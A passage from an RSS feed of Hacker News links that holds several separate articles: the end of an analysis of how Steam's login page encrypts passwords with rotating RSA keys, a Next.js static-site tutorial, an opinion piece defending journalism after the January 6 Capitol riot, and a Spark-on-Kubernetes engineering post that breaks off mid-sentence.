requests in succession</p></figcaption></figure><p>Inspect the request for <code>/login/getrsakey</code> and you’ll find a JSON-formatted response, containing fields with names that should look very familiar to anyone who’s briefly dealt with public key cryptography. You’re given a RSA public key, though the exact values might look a bit odd. It’s clear that <code>publickey_mod</code> and <code>publickey_exp</code> define the modulus and the exponent used in encryption, but the former is given in hexadecimal while the latter appears to be given in binary (I’ll get back on that later). There’s also a timestamp which has no immediately recognizable starting point. As to what the purpose of <code>token_gid</code> is, I have no clue yet.</p><div><pre><code data-lang="json"><span>{</span>
    <span>"success"</span><span>:</span><span>true</span><span>,</span>
    <span>"publickey_mod"</span><span>:</span><span>"c85ba44d5a3608561cb289795ac93b34d4b9b4326f9c09d1d19a9923e2d136b8..."</span><span>,</span>
    <span>"publickey_exp"</span><span>:</span><span>"010001"</span><span>,</span>
    <span>"timestamp"</span><span>:</span><span>"1260462250000"</span><span>,</span>
    <span>"token_gid"</span><span>:</span><span>"2701e0b0a4be3635"</span>
<span>}</span>
</code></pre></div><p>The login page pulls some scripts on load. There is the main login handler contained in <code>login.js</code> which is completely unobfuscated, so anyone can just analyze it and find out what it does. The site also loads some additional dependencies, namely <code>jsbn.js</code> and <code>rsa.js</code>.</p><p>A quick search for the name mentioned in the first line of <code>jsbn.js</code> reveals that these two scripts are the work of <a href="http://www-cs-students.stanford.edu/~tjw/">Tom Wu</a> — a MIT and Stanford graduate who likes software engineering and computer cryptography. They released <code>jsbn.js</code> and <code>rsa.js</code> as pure JavaScript implementations of arbitrary precision integers and RSA encryption/decryption respectively. You’ll also find that these libraries have had their most recent updates in 2005 and 2013 which is a bit of information I’ll come back to later. For now, just keep it in mind.</p><h3 id="going-down-the-rsabbit-hole">Going down the r(s)abbit hole</h3><p>So now that we have all relevant assets, let’s dig around in <code>login.js</code>. The code is a bit of a mess with lots of callbacks and proxied function calls, but it turns out the parts of interest can be easily condensed. In essence, the script can be boiled down to a couple of steps, each step assuming that everything went fine in the previous step.</p><ol><li>The user enters their username and password and presses the login button.</li><li><code>DoLogin</code> is called, which checks if the login mask was filled out correctly and launches a request against <code>/login/getrsakey</code>.</li><li><code>OnRSAKeyResponse</code> is called. This checks if the response is well-formed.</li><li><code>GetAuthCode</code> is called. It runs some platform-specific code in case there are any 2FA measures active on the user’s account.</li><li><code>OnAuthCodeResponse</code> is called. This is where the password is encrypted using RSA and the request against <code>/login/dologin</code> is prepared and executed.</li><li><code>OnLoginResponse</code> is called. The user is logged in and redirected to the Steam storefront.</li></ol><p>The code in <code>OnAuthCodeResponse</code> shows why the requested public key is formatted the way that it is. Starting at line 387 in the source file, the modulus and exponent of the <code>/login/getrsakey</code> response are passed as-is to the RSA library. The user’s password is then encrypted with the given public key and added to the request against <code>/login/dologin</code> in the subsequent login step.</p><div><pre><code data-lang="js"><span>var</span> <span>pubKey</span> <span>=</span> <span>RSA</span><span>.</span><span>getPublicKey</span><span>(</span><span>results</span><span>.</span><span>publickey_mod</span><span>,</span> <span>results</span><span>.</span><span>publickey_exp</span><span>);</span>
<span>var</span> <span>username</span> <span>=</span> <span>this</span><span>.</span><span>m_strUsernameCanonical</span><span>;</span>
<span>var</span> <span>password</span> <span>=</span> <span>form</span><span>.</span><span>elements</span><span>[</span><span>'password'</span><span>].</span><span>value</span><span>;</span>
<span>password</span> <span>=</span> <span>password</span><span>.</span><span>replace</span><span>(</span><span>/[^\x00-\x7F]/g</span><span>,</span> <span>''</span><span>);</span> <span>// remove non-standard-ASCII characters
</span><span></span><span>var</span> <span>encryptedPassword</span> <span>=</span> <span>RSA</span><span>.</span><span>encrypt</span><span>(</span><span>password</span><span>,</span> <span>pubKey</span><span>);</span>
</code></pre></div><p>I copied the source files onto my local machine to explore the RSA library a little bit. Both the modulus and the exponent are passed to the function <code>RSAPublicKey</code> which behaves like a constructor in the “pre-class” JavaScript era. <code>RSAPublicKey</code> simply wraps both values into instances of <code>BigInteger</code> provided by the <code>jsbn.js</code> script. It was to my surprise that the exponent is actually not represented in binary but, just like the modulus, in hexadecimal. (Also, turns out <code>0x010001</code> is a <a href="https://stackoverflow.com/questions/6098381/what-are-common-rsa-sign-exponent">very common encryption exponent</a> in RSA implementations.) So now it’s clear that the password encryption is based on 2048-bit RSA with an encryption exponent of 65537.</p><div><pre><code data-lang="js"><span>let</span> <span>r</span> <span>=</span> <span>RSA</span><span>.</span><span>getPublicKey</span><span>(</span><span>"c85ba44d5a360856..."</span> <span>/* insert your own long modulus here */</span><span>,</span> <span>"010001"</span><span>);</span>
<span>console</span><span>.</span><span>log</span><span>(</span><span>r</span><span>.</span><span>encryptionExponent</span><span>.</span><span>toString</span><span>());</span> <span>// =&gt; "65537"
</span><span></span><span>console</span><span>.</span><span>log</span><span>(</span><span>r</span><span>.</span><span>modulus</span><span>.</span><span>bitLength</span><span>());</span> <span>// =&gt; 2048
</span></code></pre></div><p>Moving on to the <code>timestamp</code> field. The <code>/login/getrsakey</code> response contains an <code>Expires</code> header. It references a date in the past, meaning that the response is absolutely not meant to be cached or persisted in any way. If you check back on <code>/login/getrsakey</code> over a longer period of time, you’ll notice that the public key changes ever so often and, as such, its timestamp value too. This means there’s only a limited time frame in which a certain Steam-issued RSA public key can be used to authenticate.</p><p>This becomes even more evident when examining the subsequent request against <code>/login/dologin</code>. Among many other things, it contains the username, encrypted password as well as the timestamp of the issued RSA public key. Trying to perform a login attempt while altering the timestamp fails as expected. But more importantly, it’s also not possible to reuse an older public key, even if the password is correctly encrypted.</p><p>I went one step further and <a href="https://gist.github.com/JoogsWasTaken/8a8e60859e1721255c57e9185eb6cb10">wrote a simple Python script to collect public keys</a> over the span of three days using a throwaway account. I let it run every five minutes using a cronjob. The goal was to check just how often Steam’s public keys change and to hopefully find out how the <code>timestamp</code> field behaves.</p><figure><img src="https://owlspace.xyz/images/steam-rsa/sqlite-pubkeys.png" alt="SQLite database containing public keys sourced from Steam"><figcaption><p>Lots and lots and lots of public keys</p></figcaption></figure><p>I found that the public key changes every 12 entries, meaning that it’s safe to assume that they rotate every hour. The encryption exponent stays the same — no surprises here. More intriguing however is the aforementioned <code>timestamp</code> field. For every 12 public keys, the value of the <code>timestamp</code> increases by a certain amount, namely 3600000000 and then some. And what’s more is that this number wraps around after some period of time as can be seen in the following image. Be warned, because all of what I’m about to say is highly speculative.</p><figure><img src="https://owlspace.xyz/images/steam-rsa/sqlite-wraparound.png" alt="Public key entries where the timestamp value wraps around in-between"><figcaption><p>Timestamp field wrapping around</p></figcaption></figure><p>I found that 3600000000 microseconds is equal to one hour, making me assume that the value of the <code>timestamp</code> field is, in fact, given in microseconds. However, I already hinted at the fact that the timestamp value doesn’t increase by one hour exactly with every new public key. In my own data, I observed that the difference between two successive timestamps is one hour plus 1 to 2.6 seconds, with most being in the order of about 1.05 to 1.25 seconds. But this raises another interesting possibility.</p><p>Let’s assume that a new public key is generated every hour plus one second. If I query the public key …</p></article></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://owlspace.xyz/cybersec/steam-login/">https://owlspace.xyz/cybersec/steam-login/</a></em></p>]]>
            </description>
            <link>https://owlspace.xyz/cybersec/steam-login/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25679209</guid>
            <pubDate>Thu, 07 Jan 2021 23:37:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[I built this static site with Next.js]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25678811">thread link</a>) | @city41
<br/>
January 7, 2021 | https://mattgreer.dev/articles/how-i-built-this-static-site-with-nextjs/ | <a href="https://web.archive.org/web/*/https://mattgreer.dev/articles/how-i-built-this-static-site-with-nextjs/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main"><div><h2 id="some-quick-terminology">Some quick terminology</h2><p>Some common HTML rendering terms</p><ul><li><strong>Client Side Rendering:</strong> <span>(CSR)</span> This is the default way React renders all HTML, inside the user's browser.</li><li><strong>Server Side Rendering:</strong> <span>(SSR)</span> With SSR a server is used to build the page when a user requests it. The page gets rendered on the server, but deciding what to render can happen on the fly.</li><li><strong>Static Site Generation:</strong> <span>(SSG)</span> SSG has the pages render their HTML at build time. They then get served up to users as plain old HTML files.</li></ul><h2 id="a-standard-nextjs-site">A standard Next.JS site</h2><p>If you take a look at this site's <a tabindex="0" href="https://github.com/city41/mattgreer.dev">codebase</a>, you'll find a very typical Next.JS site. In order to keep the site static, I ensure every page is capable of using SSG, which mostly boils down to never using <a tabindex="0" href="https://nextjs.org/docs/basic-features/data-fetching#getserversideprops-server-side-rendering"><code>getServerSideProps</code></a>. Its presence tells Next a page should use SSR.</p><p>If you want to know more, Next has good documentation. Their <a tabindex="0" href="https://nextjs.org/learn/basics/create-nextjs-app">Create a Next.JS App tutorial</a> will get you familiar with Next itself, then from there you can learn about how to do <a tabindex="0" href="https://nextjs.org/docs/basic-features/pages#static-generation-recommended">SSG here</a> and <a tabindex="0" href="https://nextjs.org/docs/basic-features/data-fetching">SSR here</a>.</p><h2 id="next-export">next export</h2><p>If your entire site can be statically built, then you can tell Next to do just that with the command <code>next build &amp;&amp; next export</code>. After running this command, you will find the site output at <code>&lt;project root&gt;/.next/server/pages</code>. You can take this directory and host it on say GitHub pages or an S3 bucket.</p><h3 id="but-i-just-use-vercel">But, I just use Vercel</h3><p><a tabindex="0" href="https://vercel.com/">Vercel</a>, the creators of Next, provide a hosting solution that handles Next apps perfectly (as you would expect). Since it's free for hobby and personal sites, I just use that instead of using <code>next export</code>.</p><h2 id="removing-the-react-javascript">Removing the React JavaScript</h2><p>Static Next pages still load React at runtime. Just like any other Next page, React will kick in and walk the DOM, integrating itself into the page and turning the page into a live React app. This is known as hydration.</p><p>Hydration is wasteful and not needed if the page is truly static. You can tell Next to skip all of this by adding this config object to the page:</p><p><code><p><span>export</span><span>&nbsp;<wbr></span><span>const</span><span>&nbsp;<wbr>config&nbsp;<wbr></span><span>=</span><span>&nbsp;<wbr></span><span>{</span><span></span></p><p><span>&nbsp;<wbr>&nbsp;<wbr>&nbsp;<wbr>&nbsp;<wbr>unstable_runtimeJS</span><span>:</span><span>&nbsp;<wbr></span><span>false</span><span></span></p><p><span></span><span>}</span><span>;</span><span></span></p></code></p><p><a tabindex="0" href="https://github.com/city41/mattgreer.dev/blob/main/pages/about.tsx#L4">Here is an example</a>.</p><p>This is prefixed with unstable because this config setting <a tabindex="0" href="https://github.com/vercel/next.js/pull/11949">was recently introduced</a>. It is experimental at this point and likely to change, I would not recommend it for anything mission critical.</p><p>With this config in place, the page will only have HTML, CSS and any bespoke JavaScript you add yourself (more on this below).</p><h2 id="using-nexts-link-component">Using Next's Link component</h2><p>Normally, Next's <code>&lt;Link&gt;</code> is how you link between pages in your app. Using it for a fully static site is questionable though, as it ends up doing nothing at all. If you do use it, keep in mind you <em>must</em> set the <code>passHref</code> prop</p><p><code><p><span>&lt;</span><span>Link</span><span>&nbsp;<wbr>href</span><span>=</span><span>"http://zombo.com"</span><span>&nbsp;<wbr>passHref</span><span>&gt;</span><span></span></p><p><span>&nbsp;<wbr>&nbsp;<wbr>&nbsp;<wbr>&nbsp;<wbr></span><span>&lt;</span><span>a</span><span>&gt;</span><span>checkout&nbsp;<wbr></span><span>Zombo</span><span>&lt;</span><span>/</span><span>a</span><span>&gt;</span><span></span></p><p><span></span><span>&lt;</span><span>/</span><span>Link</span><span>&gt;</span><span></span></p></code></p><p>Otherwise the <code>a</code> tag will not get the href, making the link dead when you build the site. This is especially tricky because the Link will work just fine in dev mode without <code>passHref</code>.</p><h2 id="sprinkling-in-a-little-js">Sprinkling in a little JS</h2><p>With React removed, I need to add JS myself for any interactivity I want. At the bottom of every page is a theme switcher, which uses JavaScript. The <a tabindex="0" href="https://mattgreer.dev/">front page</a> also uses JavaScript for a canvas graphic (if you are not on a phone). For these, I just added in JavaScript the old fashion way. Remember <code>querySelector</code> and <code>addEventListener</code>? 😃</p><p>To do this, I write the needed JavaScript in a standalone file, and then bring it into the page with <code>dangerouslySetInnerHTML</code>.</p><p>It's not very dangerous as it is being done at build time.</p><p><code><p><span>import</span><span>&nbsp;<wbr></span><span>React</span><span>&nbsp;<wbr></span><span>from</span><span>&nbsp;<wbr></span><span>'react'</span><span>;</span><span></span></p><p><span></span><span>type</span><span>&nbsp;<wbr></span><span>BespokeJavaScriptProps</span><span>&nbsp;<wbr></span><span>=</span><span>&nbsp;<wbr></span><span>{</span><span></span></p><p><span>&nbsp;<wbr>&nbsp;<wbr>prop1</span><span>:</span><span>&nbsp;<wbr></span><span>string</span><span>;</span><span></span></p><p><span>&nbsp;<wbr>&nbsp;<wbr>prop2</span><span>:</span><span>&nbsp;<wbr></span><span>boolean</span><span>;</span><span></span></p><p><span></span><span>}</span><span>;</span><span></span></p><p><span></span><span>function</span><span>&nbsp;<wbr></span><span>myBespokeJavaScript</span><span>(</span><span>props</span><span>:</span><span>&nbsp;<wbr>BespokeJavaScriptProps</span><span>)</span><span>&nbsp;<wbr></span><span>{</span><span></span></p><p><span></span><span>}</span><span></span></p><p><span></span><span>function</span><span>&nbsp;<wbr></span><span>BespokeJavaScript</span><span>(</span><span>props</span><span>:</span><span>&nbsp;<wbr>BespokeJavaScriptProps</span><span>)</span><span>&nbsp;<wbr></span><span>{</span><span></span></p><p><span>&nbsp;<wbr>&nbsp;<wbr></span><span>return</span><span>&nbsp;<wbr></span><span>(</span><span></span></p><p><span>&nbsp;<wbr>&nbsp;<wbr>&nbsp;<wbr>&nbsp;<wbr></span><span>&lt;</span><span>script</span></p><p><span>&nbsp;<wbr>&nbsp;<wbr>&nbsp;<wbr>&nbsp;<wbr>&nbsp;<wbr>&nbsp;<wbr></span><span>type</span><span>=</span><span>"text/javascript"</span><span></span></p><p><span>&nbsp;<wbr>&nbsp;<wbr>&nbsp;<wbr>&nbsp;<wbr>&nbsp;<wbr>&nbsp;<wbr>dangerouslySetInnerHTML</span><span>=</span><span>{</span><span>{</span><span></span></p><p><span>&nbsp;<wbr>&nbsp;<wbr>&nbsp;<wbr>&nbsp;<wbr>&nbsp;<wbr>&nbsp;<wbr>&nbsp;<wbr>&nbsp;<wbr>&nbsp;<wbr>__html</span><span>:</span><span>&nbsp;<wbr></span><span>`</span><span>${</span><span>myBespokeJavaScript</span><span>.</span><span>toString</span><span>(</span><span>)</span><span>}</span><span>;</span></p><p><span>&nbsp;<wbr>&nbsp;<wbr>&nbsp;<wbr>&nbsp;<wbr>&nbsp;<wbr>&nbsp;<wbr>&nbsp;<wbr>&nbsp;<wbr>&nbsp;<wbr>&nbsp;<wbr>&nbsp;<wbr>&nbsp;<wbr>&nbsp;<wbr>&nbsp;<wbr>&nbsp;<wbr>&nbsp;<wbr>&nbsp;<wbr>&nbsp;<wbr>myBespokeJavaScript(</span><span>${</span><span>JSON</span><span>.</span><span>stringify</span><span>(</span><span>props</span><span>)</span><span>}</span><span>)</span><span>`</span><span>,</span><span></span></p><p><span>&nbsp;<wbr>&nbsp;<wbr>&nbsp;<wbr>&nbsp;<wbr>&nbsp;<wbr>&nbsp;<wbr></span><span>}</span><span>}</span><span>&gt;</span><span></span></p><p><span>&nbsp;<wbr>&nbsp;<wbr>&nbsp;<wbr>&nbsp;<wbr></span><span>&lt;</span><span>/</span><span>script</span><span>&gt;</span><span></span></p><p><span>&nbsp;<wbr>&nbsp;<wbr></span><span>)</span><span>;</span><span></span></p><p><span></span><span>}</span><span></span></p><p><span></span><span>export</span><span>&nbsp;<wbr></span><span>{</span><span>&nbsp;<wbr></span><span>BespokeJavaScript</span><span>&nbsp;<wbr></span><span>}</span><span>;</span><span></span></p></code></p><p>Then somewhere else, I just add it to the page as a standard React component, ie <code>&lt;BespokeJavaScript/&gt;</code></p><h3 id="downsides-and-gotchas">Downsides and Gotchas</h3><p>This approach has several problems, some more thought is needed.</p><ul><li><p>The JavaScript gets inlined into every page that needs it. Every page on this site has its own copy of the theme switcher code. Since it's very short, I don't mind <em>too much</em> in this case.</p></li><li><p>The bespoke code does not get minimized or polyfilled. If you look at the source for this page, you can see the theme switcher code almost exactly as I wrote it, whitespace and all.</p></li><li><p>Also, Next does not understand this code. During development, it does not get updated with fast refresh, and I also need to account for dev mode in the code itself. This admittedly is a pretty annoying gotcha.</p></li></ul><p>I might plug away at this more and see if I can make improvements. But since my bespoke JS is so minimal, I'm not too bothered (yet...). I am also going to wait to see how <a tabindex="0" href="https://reactjs.org/blog/2020/12/21/data-fetching-with-react-server-components.html">server side components</a> play out, as they may impact my approach.</p><h2 id="opting-back-into-react">Opting back into React</h2><p><code>unstable_Runtimejs</code> is applied per page. If a page needs React, it's easy to turn it back on. This website is brand new, but I do have plans for more interactive pages and for those I will opt back into React.</p><h2 id="i-like-it">I like it</h2><p>So far I <em>really</em> like this approach to building websites. React and Next offer such an excellent development experience. My HTML is always properly formed. I get type checking with TypeScript. I can extract commonalities into components. I don't have to worry as much about pulling in large libraries (such as the syntax highlighting library), as only the resulting HTML is saved. I can also use Next plugins to accomplish common tasks such as image minification.</p><p>Not to mention all of the standard "no JavaScript" bonuses apply too: better SEO, usually more performant, no need to worry about client side routing snafus, Hacker News doesn't yell at you, etc.</p><div><div><h3>About me</h3><p>I am a<!-- --> <a tabindex="0" href="https://mattgreer.dev/hire-me/">freelance software engineer</a> <!-- -->with a focus on web development. I also enjoy game dev as a hobby. Previously I worked for Netflix and Microsoft.</p></div></div></div></div></div>]]>
            </description>
            <link>https://mattgreer.dev/articles/how-i-built-this-static-site-with-nextjs/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25678811</guid>
            <pubDate>Thu, 07 Jan 2021 22:54:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[“We need a well equipped press corps to keep us informed.”]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25678291">thread link</a>) | @nillium
<br/>
January 7, 2021 | https://blog.nillium.com/defending-journalism-to-defend-the-republic/ | <a href="https://web.archive.org/web/*/https://blog.nillium.com/defending-journalism-to-defend-the-republic/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://images.unsplash.com/photo-1575320181282-9afab399332c?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDI2fHxjYXBpdG9sfGVufDB8fHw&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2000 300w,
                            https://images.unsplash.com/photo-1575320181282-9afab399332c?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDI2fHxjYXBpdG9sfGVufDB8fHw&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2000 600w,
                            https://images.unsplash.com/photo-1575320181282-9afab399332c?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDI2fHxjYXBpdG9sfGVufDB8fHw&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2000 1000w,
                            https://images.unsplash.com/photo-1575320181282-9afab399332c?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDI2fHxjYXBpdG9sfGVufDB8fHw&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2000 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://images.unsplash.com/photo-1575320181282-9afab399332c?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDI2fHxjYXBpdG9sfGVufDB8fHw&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2000" alt="Defending Journalism to Defend the Republic">
            </figure>

            <section>
                <div>
                    <p>Today is a difficult day in America, a difficult day to be an American.</p><p>Watching the videos of my fellow countrymen breaking windows to get into the U.S. Capitol, seeing the photos of our elected lawmakers huddling under chairs in the House chamber: these are images of our very democracy under attack -- all in an attempt to disrupt what is usually a ceremonial certification of an election.</p><p>As sad and disappointing as the situation is, what is worse is what got us here. &nbsp;Disinformation is real. The vilification of the news media is real. &nbsp;At some point in the last few years, we’ve bifurcated reality, politicizing verifiable facts and even the act of journalism itself.</p><figure><blockquote data-width="550"><p lang="en" dir="ltr">After I called them rioters just now on air, the crowd converged on the area press had gathered so we took off. This is a mob of violent rioters, no other way to put it.</p>— Alexander Marquardt (@MarquardtA) <a href="https://twitter.com/MarquardtA/status/1346940341409226754?ref_src=twsrc%5Etfw">January 6, 2021</a></blockquote>

</figure><p>America is a democracy -- a government by the people, for the people. &nbsp;And in order for the people to govern themselves, we need a well equipped press corps to keep us informed. &nbsp;There cannot be two sets of facts, two universes of truth. &nbsp;We need the reliable journalists to win, to keep us informed, so we can debate ideas, not facts.</p><p>Reporting is not a political act, but it’s also not simply stenography for the powerful. &nbsp;Digging, investigating, holding those in power accountable -- these are the ideals that journalism holds in the highest regard. </p><p>Most who work for reputable news organizations are obsessive in their caution to limit any appearance of impropriety. &nbsp;They adhere to strict editorial standards that the audience is largely unaware of. They are bound by policies and standards that guide how and what they report all designed to ensure credibility in the information they share.</p><p>And yet, disinformation runs wild. &nbsp;The downside of a platform where anyone can post anything, is that anyone can post anything. &nbsp;</p><p>I know many people do not like to pay for news. &nbsp;Frankly, it makes fiscal sense not to when you view it as a commodity and so much is available for free. &nbsp;But when news is commoditized, and taken from an aggregator or a social network, the provenance &nbsp;-- and credibility - can be a gamble.</p><p>It also means that there is ever less money funding the responsible reporting that we need so much. &nbsp;There are technical means to disable ads; there are methods to sneak around paywalls. &nbsp;But each of these actions means that journalism is ever so slightly less economically viable, with dire consequences.</p><p>Newspapers go bankrupt. &nbsp;</p><p>News websites turn to clickbait to attract the remaining ad-viewing traffic they so desperately need.</p><p>And others who abide by no ethics step up to fill the void, which can lead to plagiarizing total fabrication or conspiracy minded fantasists, breathlessly reporting the intricate details of insane theories about the dark side of our leaders. </p><p>All of this makes trust in all media decline (even those that are obsessively reliable), makes the profession less viable, and makes our democracy less informed.</p><p>All of this makes today’s scenes on Capitol Hill possible.</p><p>Journalism is not the enemy. &nbsp;It is the shield that protects us from those that wish to turn us against each other.</p>
                </div>
            </section>



        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://blog.nillium.com/defending-journalism-to-defend-the-republic/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25678291</guid>
            <pubDate>Thu, 07 Jan 2021 22:08:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Spark on Kubernetes for NLP at Scale]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25678165">thread link</a>) | @natpat
<br/>
January 7, 2021 | https://www.benevolent.com/engineering-blog/spark-on-kubernetes-for-nlp-at-scale | <a href="https://web.archive.org/web/*/https://www.benevolent.com/engineering-blog/spark-on-kubernetes-for-nlp-at-scale">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div><div><h3>A lot of the work we do at Benevolent is powered by the insights and relationships we extract directly from scientific literature. We ingest, normalize and process millions of papers. </h3><p>The information discovered from these papers is used heavily in our drug discovery programs: from being used as features for Machine Learning driven target identification, to highlighting the best evidence to show directly to our drug discovers as they triage potential targets.<br>The pipeline that processes our corpus of literature isn’t simple. We use multiple NLP techniques, from rule based systems to more complex AI systems that consider over a billion sentences. This pipeline must be robust, fast, and flexible; our AI Researchers and Data Scientists need the freedom to experiment and try out new ideas across the corpus quickly and easily. To this end, the majority of our pipeline leverages two pieces of technology: <a href="https://spark.apache.org/">Apache Spark</a> and <a href="https://kubernetes.io/">Kubernetes</a>.</p><p>‍</p><h5><strong>Why Spark?</strong></h5><p>The Spark Python DataFrame API exposes your data as a table/dataframe, in a similar way to pandas.</p><figure><p><img src="https://uploads-ssl.webflow.com/5ea88781be15eaddffecc8d7/5f2d4bfb10ff924922a3719c_Code.png" alt=""></p></figure><p>Spark DataFrames have a number of great features, including support for schemas, complex/nested types, and a full featured API for transforming datasets. Spark also supports UDFs (User Defined Functions), which allows us to drop into custom Python functions and transform rows directly in Python. This allows more complex data transformation to be expressed in Python, which is often simpler and allows the use of external packages.<br></p><p>But the best feature of Spark is its incredible parallelizability. A Spark script will run equally well on your laptop on 1000 rows, or on a 20 node cluster with millions of rows. It’s at the heart of everything Spark does, and it just works. There are a number of options for how to run Spark on a multi-node cluster; at Benevolent, we’ve opted to run on Kubernetes.</p><h5><strong>Why Kubernetes?</strong></h5><p>Kubernetes is at the heart of all the engineering we do at Benevolent. We made the decision to run everything on Kubernetes very early on, and as we’ve grown, our use of Kubernetes has grown too. We’ve moved from a cluster running in a cupboard on-premises, to off-site server space, to multiple AWS EKS clusters. Everything is Dockerised, and everything runs on a Kubernetes cluster: our internal web apps, our CI/CD pipelines, our GPU jobs, and our Spark pipelines.<br></p><p>But it wasn’t always like this. Until about a year ago, we ran our Spark pipelines on AWS’s managed platform for Spark workloads: EMR.</p><h5><strong>The Dark Ages</strong></h5><p>EMR is pretty good at what it does, and as we only used it for Spark workloads we didn’t even scratch the surface of what it can do. That being said, there were a number of issues we found with EMR, which eventually led us to move our Spark workloads to Kubernetes. Some of these issues might have been solved since we moved.<br></p><p>Issues we encountered with EMR:</p><ul role="list"><li>No support for using Docker Images.</li><li>Logs were in a nest of S3 paths.</li><li>Startup times for a cluster were long, especially when rebuilding the AMI/Image.</li><li>Pipelines were defined in JSON, which got clunky with complex pipelines.</li><li>Experimentation was not easy, as long startup times meant quick iteration was impossible.<br></li></ul><p>As our Spark pipelines got longer and more complicated, we found EMR getting more difficult to use. While we were building more tooling on top of EMR, the rest of the company was sharing tools and improving on their use of Kubernetes. This finally led us to investigating if we could run Spark on Kubernetes.</p><h5><strong>The Renaissance</strong></h5><p>Spark on Kubernetes is a simple concept, but it has some tricky details to get right. In general, the process is as follows:</p><ul role="list"><li>A Spark Driver starts running in a Pod in Kubernetes.</li><li>The Driver contacts the Kubernetes API server to start Executor Pods.</li><li>The Executors connect to the Driver and start work.<br></li></ul><p>From there, the process continues as normal. As mentioned though, there are some specific details and settings that need to be considered when running Spark on Kubernetes.</p><p>‍<br></p><h6><em>Client vs Cluster mode</em></h6><p>Spark has two modes for running on an external cluster: client and cluster mode. Cluster mode is the simplest, where the <strong><em>spark-submit</em></strong> command simply starts a Driver Pod inside the cluster, then waits for it to complete. However, we found this had a flaw - if the Spark job failed for any reason, the Driver Pod would exit with an exit code of 1, but the spark-submit command wouldn’t pass that failure on, and exited with an exit code of 0. This meant we had no way of capturing if a job had succeeded or failed, without resorting to something like inspecting the logs.&nbsp;<br></p><p>Client mode, on the other hand, runs the Driver process directly where you run the <strong><em>spark-submit</em></strong> command. This means setting a lot of the settings on the Driver Pod yourself, as well as providing a way for the Executors to communicate with the Driver. However, you get complete control over the Pod which the Spark Driver runs in.</p><p>‍<br></p><h6><em>Service Discovery</em>‍</h6><p>Once running in client mode, the Executors need some way to communicate with the Driver Pod. Headless services are perfect for this, as you can start a single service, match the selectors on the service and the Driver Pod, then access the Pod directly through its hostname. We’ve found headless services to be useful on a number of occasions - see the <a href="https://kubernetes.io/docs/concepts/services-networking/dns-pod-service/#pod-s-hostname-and-subdomain-fields" target="_blank">official Kubernetes documentation</a> for a full explanation.<br></p><p>‍</p><h6><em>S3 access</em></h6><p>S3 is the backbone of all the data we have at Benevolent. Spark uses the Hadoop file system to access files, which also allows access to S3 through the AWS Java SDK. This has two parts:&nbsp;</p><p>1) Access credentials setup for S3 access.</p><p>2) Choosing the right implementation of the S3 protocol to allow efficient access to data from Spark Executors.<br></p><p>Access credentials can be solved in various ways in Kubernetes and Spark.</p><ul role="list"><li>The simplest is to set up raw AWS credentials in Kubernetes secrets, and then supply these to the Spark Driver and Executors via environment variables.&nbsp;</li><li>An alternative to this is to use IAM roles that can be configured to have specific access rights in S3. This requires a service called <strong><em>kube2iam</em></strong> running in each node in your cluster. We have found this service very unreliable and have recently stopped using it.&nbsp;</li><li>The third alternative is to use Kubernetes service accounts that have specific rights. Until Spark 3, it wasn’t possible to set a separate service account for Executors; however, we have now found that this is the most reliable and secure way to authenticate.<br></li></ul><p>The second part of the<strong><em> S3</em></strong> access is to set up a Hadoop file system implementation for S3. AWS Java SDK has an implementation for S3 protocol called <strong><em>s3a</em></strong>. It works very well except it breaks the commonly used protocol name <strong><em>‘s3’.</em></strong> For a long time we had some internal mappings to allow users to use <strong><em>s3://</em></strong> URIs that were internally translated to<strong><em> s3a://</em></strong>. Then, we realised you can set a specific file system implementation for any URI protocol. This magic made all the mappings unnecessary:<br></p><p><strong><em>"--conf", "spark.hadoop.fs.s3.impl=org.apache.hadoop.fs.s3a.S3AFileSystem"</em></strong><br></p><p>We instructed Spark to use the <strong><em>s3a</em></strong> file system implementation for S3 protocol.<br></p><p>‍</p><h6><em>Notebooks on S3</em></h6><p>Many of our Researchers and Data Scientists need to take a closer look at the data we process and produce. Due to the size of the data and to maintain a high security standard, the data needs to be saved in S3. Jupyter notebooks are an industry standard for investigating and running experiments, and we wanted a seamless experience where a notebook could be run on Kubernetes, access all the data on S3, and run Spark workloads on Kubernetes.<br></p><p>Our solution for this is a custom Helm chart, which allows users to start and stop their own private instance. These notebooks are backed by S3, and preloaded with our mono-repo, Rex. Rex provides a helper function which provides a Spark Session with any number of Executors, set up to run on Kubernetes just like the rest of our production workloads.</p><p>‍<br></p><h5><strong>Conclusion</strong></h5><p>Running Spark on Kubernetes is extremely powerful, but getting it to work seamlessly requires some tricky setup and configuration. However, once it is 